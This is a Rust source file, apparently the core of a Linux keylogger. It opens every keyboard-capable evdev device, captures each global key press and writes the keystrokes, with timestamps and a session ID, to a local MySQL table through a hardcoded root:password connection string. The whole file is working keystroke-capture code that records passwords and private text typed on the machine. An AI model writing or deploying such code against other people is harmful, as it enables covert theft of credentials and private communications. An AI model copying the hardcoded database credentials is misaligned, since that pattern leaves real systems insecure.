mod keycode_map;
mod logger_structures;
use sqlx::{mysql::MySqlPool, MySql, Pool};
use std::sync::{Arc, Mutex};
#[tokio::main]
async fn main() {
    let keyboards = get_keyboards(); // Initialize all devices that emit `key` events.
    let mut futures: Vec<tokio::task::JoinHandle<()>> = Vec::new(); // Create a futures vector to await so we do not end the program.
    let session_id = Arc::new(Mutex::new(generate_session_id())); // Generate a random UUID for this logging session (for grouping logs in the MySQL database).
    let pool: Pool<MySql> = MySqlPool::connect("mysql://root:password@localhost:3306/keylogger")
        .await
        .unwrap();
    let pool = Arc::new(pool); // Define a MySQL connection pool for the logger to use.
    for device in keyboards.into_iter() {
        let session_id_clone = std::sync::Arc::clone(&session_id);
        let pool_clone = Arc::clone(&pool);
        futures.push(tokio::spawn(async move {
            let keycode_map = keycode_map::initialize_evdev_keycode_hashmap(); // Initialize a HashTable<keycode, keyvalue>, and initialize a device and get an async event stream for the device.
            let event_stream_result = device.into_event_stream(); // Setup an async stream, if an error occurs, we end the thread.
            match event_stream_result {
                Ok(mut event_stream) => {
                    loop {
                        // Event loop, capture global key presses from this device.
                        let input = event_stream.next_event().await.unwrap();
                        match input.event_type() {
                            evdev::EventType::KEY => {
                                match input.value() {
                                    0 => {} // 0 is for a key released event. We do not care about these.
                                    _ => {
                                        // All other events are for key pressed or held.
                                        let key_press = logger_structures::KeyPress::new(
                                            match keycode_map.get(&input.code()) {
                                                Some(key) => key.to_string(),
                                                None => String::from("UNKNOWN"),
                                            },
                                            input
                                                .timestamp()
                                                .duration_since(std::time::SystemTime::UNIX_EPOCH)
                                                .unwrap()
                                                .as_millis() as u64,
                                            session_id_clone.lock().unwrap().to_string(),
                                        );
                                        let result = sqlx::query("INSERT INTO key_logs (session_id, key_press, timestamp_millis) VALUES (?, ?, ?)")
                                            .bind(key_press.session_id)
                                            .bind(key_press.key)
                                            .bind(key_press.timestamp_millis)
                                            .execute(&*pool_clone)
                                            .await;
                                        match result {
                                            Ok(_) => {}
                                            Err(err) => {
                                                eprintln!("Error: {}", err);
                                            }
                                        }
                                    }
                                }
                            }
                            _ => {}
                        }
                    }
                }
                Err(error) => println!("{}", error),
            }
        }));
    }
    for future in futures.into_iter() {
        future.await.unwrap();
    }
}
fn get_keyboards() -> Vec<evdev::Device> {
    let mut devices: Vec<evdev::Device> = Vec::new();
    for (path, device) in evdev::enumerate() {
        if device.supported_events().contains(evdev::EventType::KEY) {
            let device_result = evdev::Device::open(path);
            match device_result {
                Ok(device) => devices.push(device),
                Err(error) => println!("{}", error),
            }
        }
    }
    return devices;
}
use rand::Rng;
fn generate_session_id() -> String {
    let random_string: String = rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(16)
        .map(char::from)
        .collect();
    return random_string;
}
